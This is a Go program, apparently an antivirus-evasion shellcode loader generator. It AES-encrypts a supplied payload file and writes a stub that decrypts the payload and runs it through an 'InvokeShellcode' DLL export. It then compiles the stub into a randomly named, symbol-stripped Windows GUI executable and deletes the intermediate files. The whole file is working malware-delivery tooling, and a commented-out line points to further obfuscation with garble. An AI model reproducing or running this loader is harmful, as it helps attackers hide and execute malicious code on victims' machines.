package main

/*
	CopyRight: A10nggg/Yeuoly
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	rrand "math/rand"
	"path/filepath"

	"crypto/rand"
	"os"
	"os/exec"
	"time"
)

func Readcode(filename string) string {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("出现错误了。", err)
	}
	return string(data)
}

var (
	codes   = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	codeLen = len(codes)
)

func RandNewStr(len int) string { //随机生成deskey
	data := make([]byte, len)
	rrand.Seed(time.Now().UnixNano())
	for i := 0; i < len; i++ {
		idx := rrand.Intn(codeLen)
		data[i] = byte(codes[idx])
	}
	return string(data)
}

func encrypt(key []byte, text string) (string, error) {
	// 创建一个新的 Cipher.Block 对象
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	// 生成随机的初始化向量
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return "", err
	}

	// 创建一个加密器对象
	ciphertext := make([]byte, aes.BlockSize+len(text))
	copy(ciphertext[:aes.BlockSize], iv)
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], []byte(text))

	// 返回加密后的数据，包括 IV 和密文
	return base64.URLEncoding.EncodeToString(ciphertext), nil
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("请输入加密的文件名称!")
	} else {
		filename := os.Args[1]
		aeskey := RandNewStr(32)
		code := Readcode(filename)
		newcode, err := encrypt([]byte(aeskey), code)
		if err != nil { // Encryption failed!
			fmt.Printf("%v", err)
		}
		//ncode := hex.EncodeToString([]byte(newcode)) //hex编码
		SourceCode := fmt.Sprintf(`package main

		import (
			"crypto/aes"
			"crypto/cipher"
			"encoding/base64"
			"fmt"
			"syscall"
			"unsafe"
		)
		
		func decrypt(key []byte, cryptoText string) (string, error) {
			// 解码密文
			ciphertext, err := base64.URLEncoding.DecodeString(cryptoText)
			if err != nil {
				return "", err
			}
		
			// 创建一个新的 Cipher.Block 对象
			block, err := aes.NewCipher(key)
			if err != nil {
				return "", err
			}
		
			// 提取初始化向量
			iv := ciphertext[:aes.BlockSize]
			ciphertext = ciphertext[aes.BlockSize:]
		
			// 创建一个解密器对象
			plaintext := make([]byte, len(ciphertext))
			stream := cipher.NewCFBDecrypter(block, iv)
			stream.XORKeyStream(plaintext, ciphertext)
		
			// 返回解密后的明文
			return string(plaintext), nil
		}
		func IntPtr(n int) uintptr {
			return uintptr(n)
		}
		
		func Lib(decoded []byte) {
			lib := syscall.NewLazyDLL("1.dll")
			proc := lib.NewProc("InvokeShellcode")
			proc.Call((uintptr)(unsafe.Pointer(&decoded[0])), IntPtr(len(decoded)))
		}
		
		
		func main() {
		
			//if shouldExit() {
			key := []byte("%v") // 256-bit AES 密钥
			cryptoText := "%v"
			// 解密加密后的字符串
			decryptedText, err := decrypt(key, cryptoText)
			if err != nil {
				fmt.Println(err)
				return
			}
		
			Lib([]byte(decryptedText))
			//	}
		}
		`, aeskey, newcode)
		f, _ := os.Create("doing.go")
		_, _ = f.Write([]byte(SourceCode))
		f.Close()
		scriptPath, err := os.Getwd()
		if err != nil {
			fmt.Println(err)
			return
		}
		randname := RandStr(4) + ".exe"
		batfile, _ := os.Create("doing.bat")
		// _, _ = batfile.Write([]byte("garble -tiny -literals -seed=random build -o " + randname + " -trimpath -ldflags=\"-w -s\" doing.go"))
		_, _ = batfile.Write([]byte("go build -o " + randname + " -trimpath -ldflags=\"-w -s -H windowsgui\" doing.go"))

		batfile.Close()

		time.Sleep(time.Duration(1) * time.Second)
		cmd := exec.Command(filepath.Join(scriptPath, "doing.bat"))

		s := cmd.Start()
		fmt.Printf("%v", s)
		time.Sleep(time.Duration(1) * time.Second)

		os.RemoveAll("doing.bat")
		os.RemoveAll("doing.go")

	}
}
func readshell(mumafile string) string {
	info, _ := ioutil.ReadFile(mumafile)

	//compileRegex := regexp.MustCompile("= \"(.*?)\";")
	//matchArr := compileRegex.FindStringSubmatch(string(info))
	return string(info)
}

func RandStr(length int) string {
	str := "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := []byte(str)
	result := []byte{}
	rrand.Seed(time.Now().UnixNano() + int64(rrand.Intn(100)))
	for i := 0; i < length; i++ {
		result = append(result, bytes[rrand.Intn(len(bytes))])
	}
	return string(result)
}
